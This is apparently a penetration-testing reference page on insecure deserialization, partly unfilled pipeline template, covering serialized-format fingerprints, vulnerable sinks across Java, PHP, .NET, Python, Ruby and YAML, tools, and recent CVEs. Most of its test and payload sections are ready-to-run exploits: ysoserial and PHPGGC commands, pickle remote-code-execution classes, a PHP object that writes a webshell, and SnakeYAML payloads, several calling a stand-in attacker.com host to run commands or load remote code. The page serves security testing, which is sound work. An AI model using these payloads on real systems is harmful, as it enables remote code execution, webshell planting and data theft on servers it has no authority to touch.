# Deserialization Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: — · Items: 0_

---

## What

_Define the class, prerequisites, and typical finding shape. Fill with real content._
_pending enrichment — baseline opener below_

See items under ## Items for per-finding details.

---

## CVEs

_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._

---

## Probes

_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
_pending enrichment_

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

_Patch guidance and detection rules. Populated from vendor advisories._
_pending enrichment_

---

## References

_Populated by daily refresh-latest pipeline._

---

## Items

> Insecure deserialization — when untrusted data is used to reconstruct objects, allowing attackers to trigger arbitrary code execution via gadget chains.

## Format fingerprinting

| Prefix / pattern | Format |
|---|---|
| `rO0` | Java `ObjectInputStream` (base64 of `AC ED 00 05`) |
| `\xac\xed` | Java raw |
| `a:`, `O:`, `s:` | PHP `serialize()` |
| `gASV` | Python pickle (base64) |
| `\x80\x04` | Python pickle protocol 4 raw |
| `TzoxNjoi` | Base64 of PHP `O:16:"...` |
| `AAEAAAD/////` | .NET `BinaryFormatter` |
| `{"$type":"..."}` | .NET Json.NET with TypeNameHandling |

Check cookies, hidden fields, API bodies, cache entries, session blobs, message queues.

## Surface

- Java: `ObjectInputStream.readObject()` — cookies, JMX, RMI, custom protocols; high-value sinks: RMI, JMX, LDAP (JNDI), Spring actuator `/jolokia`, Log4Shell-era JNDI injection
- PHP: `unserialize()` — session data, cookies, API params
- .NET: `BinaryFormatter`, `XmlSerializer`, `DataContractSerializer` — SOAP, ViewState
- Python: `pickle.loads()` — ML model endpoints, job queues, session stores; also: `yaml.load`, `jsonpickle`, `marshal`, `shelve`
- Ruby: `Marshal.load()` — Rails session cookies (pre-5.2), Sidekiq job args
- Node.js: `node-serialize`, `funcster`, `serialize-javascript`, `serialize-to-js` — JSON-adjacent
- YAML: `yaml.load()` (PyYAML pre-5.1), SnakeYAML — anywhere YAML is parsed

## Test Approach

1. **Identify serialized data** — look for:
   - Base64 blobs in cookies: `rO0AB` prefix = Java serialized
   - `a:3:{s:4:...}` = PHP serialized
   - `AAEAAAD` = .NET BinaryFormatter
   - `\x80\x04\x95` = Python pickle
   - `---\n` or `!!python/object:` = YAML

2. **Java deserialization** — generate gadget chain with ysoserial:

   ```
   java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/rce' | base64 -w 0
   ```

   Inject into cookie/header, trigger deserialization endpoint.

3. **PHP object injection** — find a `__wakeup()` or `__destruct()` with dangerous logic; craft magic method chain:

   ```php
   O:8:"UserPref":2:{s:4:"path";s:21:"/var/www/html/cmd.php";s:7:"content";s:17:"<?php system($_GET['c']); ?>";}
   ```

4. **.NET ViewState** — check if MAC validation disabled: decode base64, edit, re-encode; or use ysoserial.net:

   ```
   ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "calc.exe" --validationalg="SHA1" --validationkey="<key>"
   ```

5. **Python pickle** — craft malicious pickle payload:

   ```python
   import pickle, os
   class Exploit(object):
       def __reduce__(self):
           return (os.system, ('curl attacker.com/rce',))
   payload = pickle.dumps(Exploit())
   ```

6. **YAML** — SnakeYAML RCE:

   ```yaml
   !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/payload.jar"]]]]
   ```

7. **Blind OOB detection** — use Interactsh for DNS callback in gadget chain:

   ```
   java -jar ysoserial.jar URLDNS "http://attacker.interactsh.com" | base64 -w 0
   ```

## PHP Phar deserialization

Any PHP filesystem function called on a `phar://` URI triggers unserialize of phar metadata. Upload a valid image containing phar metadata, then reference it via `phar://`:

```
phar://upload/file.jpg/exploit
```

Common gadget chains (PHPGGC): Laravel, Symfony, Drupal, Guzzle, Monolog, Slim.

```bash
phpggc Laravel/RCE9 system 'id' -u -b
```

## .NET machineKey / ViewState

Leaked `machineKey` = full RCE on ASP.NET. Generate payload:

```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
  --path="/" --apppath="/" --validationalg="SHA1" --validationkey="<machineKey>"
```

`ObjectStateFormatter` (ViewState), `LosFormatter`, `SoapFormatter`, `Json.NET` with `TypeNameHandling=Auto/All` are all sinks.

## Detection without RCE (OOB)

Use DNS callback gadgets to confirm deserialization without needing a working chain:

```bash
# Java URLDNS gadget — triggers DNS lookup, no classpath dependency
java -jar ysoserial.jar URLDNS "http://attacker.interactsh.com" | base64 -w 0

# .NET TypeConfuseDelegate ping
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping attacker.interactsh.com"

# PHP PHPGGC with sleep sink
phpggc -b Slim/RCE1 system 'sleep 5'
```

## Tools

- **ysoserial** — Java gadget chains: CommonsCollections1-11, Spring, Hibernate, ROME, JSON-lib
- **ysoserial.net** — .NET BinaryFormatter/ViewState gadget chains (pwntester)
- **marshalsec** — beyond native: Jackson, SnakeYAML, XStream, BlazeDS, Kryo
- **PHPGGC** — PHP gadget chain generator: `phpggc -l` lists available chains
- **Interactsh** — OOB DNS/HTTP for blind deserialization detection
- **nuclei** — deserialization detection templates

## Payloads / Probes

```
# Java - CommonsCollections6 (no @6 requirement)
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(id)' | base64 -w 0

# PHP - simple object injection skeleton
O:9:"EvilClass":1:{s:3:"cmd";s:2:"id";}

# Python pickle RCE
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))
print(base64.b64encode(pickle.dumps(RCE())).decode())

# YAML SnakeYAML
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: "ldap://attacker.com/exploit"
  autoCommit: true
```

## Chain Opportunities

- **Deserialization → RCE** — gadget chain triggers OS command execution
- **Deserialization → SSRF** — URLDNS gadget forces DNS lookup to probe internals
- **Deserialization → file write** — write webshell to web root
- **PHP deserialization + POP chain → SQLi** — `__toString()` triggers query with attacker data
- **.NET ViewState deserialization → Windows shell** — SYSTEM-level if app pool runs elevated

## Recent Intel

- **CVE-2026-45659** · Microsoft SharePoint Server authenticated deserialization RCE — Site Member perms sufficient; affects SharePoint 2016/2019/Subscription Edition; added CISA KEV 2026-07-01; patch May 2026 — https://nvd.nist.gov/vuln/detail/CVE-2026-45659
- **CVE-2023-3519** · Citrix ADC/NetScaler unauthenticated deserialization via NSCIService/AAA XML API → full system RCE, affects 13.1-13.1-49.16 · https://www.assetnote.io/resources/research/analysis-of-cve-2023-3519-in-citrix-adc-and-netscaler-gateway
- **CVE-2023-24489** · Citrix ShareFile pre-auth .NET XML deserialization in `UploadClientModule.asmx`, `ObjectDataProvider` gadget chain · https://www.assetnote.io/resources/research/advisory-sharefile-pre-auth-rce-cve-2023-24489
- **CVE-2023-38646** · Metabase H2 JDBC INIT parameter — SQL-to-Java deserialization bridge, pre-auth on `/api/setup/validate` · https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646
